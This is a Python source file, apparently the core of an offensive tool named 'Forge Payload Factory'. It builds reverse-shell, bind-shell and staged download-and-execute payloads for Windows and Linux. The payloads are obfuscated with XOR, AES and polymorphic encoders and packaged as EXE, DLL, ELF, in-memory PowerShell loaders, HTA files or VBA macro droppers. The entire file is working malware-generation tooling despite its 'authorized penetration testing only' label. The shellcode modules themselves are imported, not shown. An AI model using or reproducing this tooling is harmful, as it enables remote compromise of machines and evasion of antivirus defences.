"""
Forge Payload Factory — Main Orchestrator
==========================================
Standalone payload generation (not C2 beacons).

Workflow:
  1. Shellcode template (x64/x86/arm64) encodes lhost:lport into raw bytes
  2. Encoder chain (XOR → AES → polymorphic) obfuscates the shellcode
  3. Format builder wraps encoded shellcode in PE/ELF/DLL/PS1/HTA container
  4. Result written to output file and returned as PayloadArtifact

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import hashlib
import os
import secrets
import socket
import struct
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

# ── Available payload types ────────────────────────────────────────────
PAYLOAD_TYPES: dict[str, dict[str, Any]] = {
    # Windows
    "windows/x64/reverse_tcp":      {"os": "windows", "arch": "x64",   "proto": "tcp",  "dir": "reverse"},
    "windows/x64/reverse_http":     {"os": "windows", "arch": "x64",   "proto": "http", "dir": "reverse"},
    "windows/x64/bind_tcp":         {"os": "windows", "arch": "x64",   "proto": "tcp",  "dir": "bind"},
    "windows/x64/exec":             {"os": "windows", "arch": "x64",   "proto": "exec", "dir": "none"},
    "windows/x86/reverse_tcp":      {"os": "windows", "arch": "x86",   "proto": "tcp",  "dir": "reverse"},
    "windows/x86/bind_tcp":         {"os": "windows", "arch": "x86",   "proto": "tcp",  "dir": "bind"},
    # Linux
    "linux/x64/reverse_tcp":        {"os": "linux",   "arch": "x64",   "proto": "tcp",  "dir": "reverse"},
    "linux/x64/bind_tcp":           {"os": "linux",   "arch": "x64",   "proto": "tcp",  "dir": "bind"},
    "linux/x86/reverse_tcp":        {"os": "linux",   "arch": "x86",   "proto": "tcp",  "dir": "reverse"},
    "linux/arm64/reverse_tcp":      {"os": "linux",   "arch": "arm64", "proto": "tcp",  "dir": "reverse"},
    # Staged (download-and-exec)
    "windows/x64/reverse_http_staged":   {"os": "windows", "arch": "x64", "proto": "http", "dir": "reverse", "staged": True},
    "linux/x64/reverse_tcp_staged":      {"os": "linux",   "arch": "x64", "proto": "tcp",  "dir": "reverse", "staged": True},
    # Reverse TCP with embedded shell
    "reverse_tcp":  {"os": "auto",    "arch": "x64",   "proto": "tcp",  "dir": "reverse"},
}

ENCODERS   = ["none", "xor", "aes", "polymorphic", "sgn"]
FORMATS    = ["exe", "dll", "elf", "ps1", "hta", "vba", "raw"]
ARCHES     = ["x86", "x64", "arm64"]


# ══════════════════════════════════════════════════════════════════════
#  OUTPUT ARTIFACT
# ══════════════════════════════════════════════════════════════════════

@dataclass
class PayloadArtifact:
    success:       bool = False
    output_path:   str  = ""
    payload_type:  str  = ""
    format:        str  = ""
    arch:          str  = ""
    encoder:       str  = ""
    iterations:    int  = 1
    size:          int  = 0
    sha256:        str  = ""
    md5:           str  = ""
    build_time_s:  float = 0.0
    lhost:         str  = ""
    lport:         int  = 4444
    error:         str  = ""
    notes:         list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "success":      self.success,
            "output_path":  self.output_path,
            "payload_type": self.payload_type,
            "format":       self.format,
            "arch":         self.arch,
            "encoder":      self.encoder,
            "size":         self.size,
            "sha256":       self.sha256,
            "md5":          self.md5,
            "build_time_s": round(self.build_time_s, 3),
            "lhost":        self.lhost,
            "lport":        self.lport,
            "error":        self.error,
            "notes":        self.notes,
        }

    def __str__(self) -> str:
        if not self.success:
            return f"[FAILED] {self.error}"
        return (
            f"[+] Payload: {self.payload_type}  format={self.format}  arch={self.arch}\n"
            f"    Encoder: {self.encoder}  iterations={self.iterations}\n"
            f"    Output:  {self.output_path}  ({self.size:,} bytes)\n"
            f"    SHA256:  {self.sha256}\n"
            f"    MD5:     {self.md5}\n"
            f"    Built in {self.build_time_s:.2f}s"
        )


# ══════════════════════════════════════════════════════════════════════
#  PAYLOAD FACTORY
# ══════════════════════════════════════════════════════════════════════

class PayloadFactory:
    """Generate standalone encoded payloads in multiple formats."""

    # ── Public API ─────────────────────────────────────────────────────

    @staticmethod
    def list_payloads() -> str:
        """Return human-readable list of all available payload types."""
        lines = ["", "  Available Payload Types", "  " + "─" * 50, ""]
        for name, meta in sorted(PAYLOAD_TYPES.items()):
            staged = "  [staged]" if meta.get("staged") else ""
            lines.append(f"    {name:<40} {meta['os']}/{meta['arch']}{staged}")
        lines += [
            "",
            "  Encoders: " + ", ".join(ENCODERS),
            "  Formats:  " + ", ".join(FORMATS),
            "  Arches:   " + ", ".join(ARCHES),
            "",
        ]
        return "\n".join(lines)

    def generate(
        self,
        payload_type: str = "windows/x64/reverse_tcp",
        lhost: str = "127.0.0.1",
        lport: int = 4444,
        fmt: str = "exe",
        arch: str = "x64",
        encoder: str = "none",
        iterations: int = 1,
        output_path: str | None = None,
        cmd: str = "cmd.exe",
    ) -> str:
        """Generate an encoded payload and write to disk.

        Returns the output file path on success, raises RuntimeError on failure.
        """
        artifact = self._build(
            payload_type=payload_type,
            lhost=lhost,
            lport=lport,
            fmt=fmt,
            arch=arch,
            encoder=encoder,
            iterations=max(1, iterations),
            output_path=output_path,
            cmd=cmd,
        )
        if not artifact.success:
            raise RuntimeError(artifact.error)
        return artifact.output_path

    def generate_artifact(self, **kwargs) -> PayloadArtifact:
        """Like generate() but returns the full PayloadArtifact."""
        return self._build(**kwargs)

    # ── Internal build pipeline ────────────────────────────────────────

    def _build(
        self,
        payload_type: str,
        lhost: str,
        lport: int,
        fmt: str,
        arch: str,
        encoder: str,
        iterations: int,
        output_path: str | None,
        cmd: str = "cmd.exe",
    ) -> PayloadArtifact:
        t0 = time.monotonic()
        art = PayloadArtifact(
            payload_type=payload_type,
            format=fmt,
            arch=arch,
            encoder=encoder,
            iterations=iterations,
            lhost=lhost,
            lport=lport,
        )

        # Resolve canonical payload type
        ptype = self._resolve_type(payload_type, arch)
        meta  = PAYLOAD_TYPES.get(ptype, {})

        # Effective arch from type or override
        eff_arch = meta.get("arch", arch)

        # Step 1: Shellcode
        try:
            raw = self._gen_shellcode(ptype, meta, lhost, lport, cmd, eff_arch)
        except Exception as exc:
            art.error = f"Shellcode generation failed: {exc}"
            return art

        # Step 2: Encoder chain
        try:
            encoded, enc_notes = self._encode(raw, encoder, iterations)
            art.notes.extend(enc_notes)
        except Exception as exc:
            art.error = f"Encoding failed: {exc}"
            return art

        # Step 3: Format builder
        try:
            payload_bytes, fmt_notes = self._format(encoded, fmt, eff_arch, lhost, lport, meta)
            art.notes.extend(fmt_notes)
        except Exception as exc:
            art.error = f"Format build failed: {exc}"
            return art

        # Step 4: Write to disk
        try:
            out = self._write(payload_bytes, fmt, output_path, payload_type, lhost, lport)
        except Exception as exc:
            art.error = f"Write failed: {exc}"
            return art

        art.success      = True
        art.output_path  = str(out)
        art.size         = len(payload_bytes)
        art.sha256       = hashlib.sha256(payload_bytes).hexdigest()
        art.md5          = hashlib.md5(payload_bytes).hexdigest()
        art.build_time_s = time.monotonic() - t0
        return art

    def _resolve_type(self, payload_type: str, arch: str) -> str:
        """Normalize shorthand payload types to canonical names."""
        if payload_type in PAYLOAD_TYPES:
            return payload_type
        # shorthand → full
        shortcuts = {
            "reverse_tcp":  f"windows/{arch}/reverse_tcp",
            "reverse_http": f"windows/{arch}/reverse_http",
            "bind_tcp":     f"windows/{arch}/bind_tcp",
        }
        return shortcuts.get(payload_type, payload_type)

    # ── Shellcode generation ───────────────────────────────────────────

    def _gen_shellcode(
        self,
        ptype: str,
        meta: dict,
        lhost: str,
        lport: int,
        cmd: str,
        arch: str,
    ) -> bytes:
        """Dispatch to the correct shellcode module."""
        target_os = meta.get("os", "windows")
        proto     = meta.get("proto", "tcp")
        direction = meta.get("dir", "reverse")
        staged    = meta.get("staged", False)

        if arch == "x64":
            from forge_payload.shellcode.shellcode_x64 import ShellcodeX64
            sc = ShellcodeX64(lhost=lhost, lport=lport, cmd=cmd)
        elif arch == "x86":
            from forge_payload.shellcode.shellcode_x86 import ShellcodeX86
            sc = ShellcodeX86(lhost=lhost, lport=lport, cmd=cmd)
        elif arch == "arm64":
            from forge_payload.shellcode.shellcode_arm64 import ShellcodeARM64
            sc = ShellcodeARM64(lhost=lhost, lport=lport, cmd=cmd)
        else:
            raise ValueError(f"Unsupported arch: {arch}")

        if direction == "bind":
            return sc.bind_tcp()
        if proto == "http" and not staged:
            return sc.reverse_http() if target_os == "windows" else sc.reverse_tcp()
        if staged:
            return sc.staged_http() if proto == "http" else sc.staged_tcp()
        if meta.get("proto") == "exec":
            return sc.exec_cmd()
        # Default: reverse TCP
        if target_os == "linux":
            return sc.reverse_tcp_linux()
        return sc.reverse_tcp()

    # ── Encoder ────────────────────────────────────────────────────────

    def _encode(self, data: bytes, encoder: str, iterations: int) -> tuple[bytes, list[str]]:
        """Apply encoder chain, returning (encoded_bytes, notes)."""
        notes: list[str] = []
        if encoder == "none":
            return data, notes

        if encoder == "xor":
            from forge_payload.encoders.encoder_xor import XorEncoder
            enc = XorEncoder()
            result = data
            for i in range(iterations):
                result, key = enc.encode(result)
                notes.append(f"XOR iteration {i+1}: key=0x{key:02x}  size={len(result)}")
            return result, notes

        if encoder == "aes":
            from forge_payload.encoders.encoder_aes import AesEncoder
            enc = AesEncoder()
            result = data
            for i in range(iterations):
                result, iv, key_hex = enc.encode(result)
                notes.append(f"AES-256-CBC iteration {i+1}: iv={iv.hex()} key={key_hex[:8]}...")
            return result, notes

        if encoder in ("polymorphic", "sgn"):
            from forge_payload.encoders.encoder_poly import PolyEncoder
            enc = PolyEncoder()
            result, stub_info = enc.encode(data, iterations=iterations)
            notes.append(f"Polymorphic: {stub_info}")
            return result, notes

        raise ValueError(f"Unknown encoder: {encoder}")

    # ── Format builder ─────────────────────────────────────────────────

    def _format(
        self,
        shellcode: bytes,
        fmt: str,
        arch: str,
        lhost: str,
        lport: int,
        meta: dict,
    ) -> tuple[bytes, list[str]]:
        """Wrap shellcode in the chosen output format."""
        notes: list[str] = []

        if fmt == "raw":
            return shellcode, ["raw shellcode bytes, no wrapper"]

        if fmt in ("exe", "pe"):
            from forge_payload.formats.format_pe import PeFormat
            data = PeFormat(arch=arch).build(shellcode)
            notes.append(f"PE EXE loader ({arch})")
            return data, notes

        if fmt == "dll":
            from forge_payload.formats.format_dll import DllFormat
            data = DllFormat(arch=arch).build(shellcode)
            notes.append(f"PE DLL loader ({arch})")
            return data, notes

        if fmt == "elf":
            from forge_payload.formats.format_elf import ElfFormat
            data = ElfFormat(arch=arch).build(shellcode)
            notes.append(f"ELF loader ({arch})")
            return data, notes

        if fmt == "ps1":
            from forge_payload.formats.format_ps1 import Ps1Format
            data = Ps1Format().build(shellcode, lhost=lhost, lport=lport)
            notes.append("PowerShell loader (in-memory, no disk writes)")
            return data, notes

        if fmt in ("hta", "vba"):
            from forge_payload.formats.format_hta import HtaFormat
            data = HtaFormat(fmt=fmt).build(shellcode, lhost=lhost, lport=lport)
            notes.append(f"{'HTA' if fmt == 'hta' else 'VBA macro'} dropper")
            return data, notes

        raise ValueError(f"Unknown format: {fmt}")

    # ── Output ─────────────────────────────────────────────────────────

    def _write(
        self,
        data: bytes,
        fmt: str,
        output_path: str | None,
        payload_type: str,
        lhost: str,
        lport: int,
    ) -> Path:
        """Write payload bytes to disk, auto-generating a filename if needed."""
        ext_map = {
            "exe": ".exe", "dll": ".dll", "elf": "",
            "ps1": ".ps1", "hta": ".hta", "vba": ".vba",
            "raw": ".bin",
        }
        ext = ext_map.get(fmt, ".bin")

        if output_path:
            out = Path(output_path)
        else:
            ts   = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
            safe = payload_type.replace("/", "_").replace("\\", "_")
            out  = Path(f"results/payloads/{safe}_{lhost}_{lport}_{ts}{ext}")

        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_bytes(data)
        return out
